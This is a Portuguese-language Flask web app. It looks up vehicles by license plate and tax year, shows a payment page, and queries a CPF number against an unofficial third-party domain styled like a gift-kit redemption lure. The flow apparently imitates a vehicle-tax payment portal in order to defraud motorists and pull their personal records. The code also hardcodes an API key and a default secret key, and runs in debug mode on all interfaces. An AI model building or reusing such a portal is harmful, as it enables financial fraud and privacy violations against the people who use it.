from flask import Flask, render_template, url_for, request, redirect, flash
import os
import requests
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "a secret key")
app.static_folder = 'static'

API_KEY = os.environ.get("VEHICLE_API_KEY", "6b68366ccc3b47c77ceb9d3d0f2b3799")
API_URL = "https://wdapi2.com.br/consulta/{placa}/" + API_KEY
CPF_API_URL = "https://resgatarkitwella.com/api/?cpf={cpf}"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/consultar', methods=['POST'])
def consultar():
    placa = request.form.get('placa', '').strip().upper()
    exercicio = request.form.get('exercicio')

    if not placa:
        flash('Por favor, informe a placa do veículo.')
        return redirect(url_for('index'))

    if not placa.isalnum() or len(placa) != 7:
        flash('Formato de placa inválido. Use o formato AAANNNN ou AAAAANN.')
        return redirect(url_for('index'))

    try:
        response = requests.get(API_URL.format(placa=placa), timeout=10)
        response.raise_for_status()

        veiculo_data = response.json()
        if veiculo_data.get('codigoRetorno') == '0':
            return render_template('veiculo.html', veiculo=veiculo_data)
        else:
            flash('Não foi possível encontrar informações para esta placa.')
            return redirect(url_for('index'))

    except requests.RequestException as e:
        print(f"Erro ao consultar API: {e}")
        flash('Ocorreu um erro ao consultar os dados do veículo. Tente novamente.')
        return redirect(url_for('index'))

@app.route('/pagamento', methods=['GET'])
def pagamento():
    return render_template('pagamento.html')

@app.route('/validar_cpf', methods=['POST'])
def validar_cpf():
    cpf = request.form.get('cpf', '').strip()
    cpf_numerico = ''.join(filter(str.isdigit, cpf))

    if not cpf_numerico or len(cpf_numerico) != 11:
        flash('CPF inválido. Por favor, digite um CPF válido.')
        return redirect(url_for('pagamento'))

    try:
        response = requests.get(CPF_API_URL.format(cpf=cpf_numerico), timeout=10)
        response.raise_for_status()

        dados = response.json()
        if dados.get('status') == 200:
            return render_template('dados_usuario.html', 
                                dados=dados.get('dados'),
                                now=datetime.now,
                                timedelta=timedelta)
        else:
            flash('Não foi possível validar o CPF informado.')
            return redirect(url_for('pagamento'))

    except requests.RequestException as e:
        print(f"Erro ao consultar API de CPF: {e}")
        flash('Ocorreu um erro ao validar o CPF. Tente novamente.')
        return redirect(url_for('pagamento'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)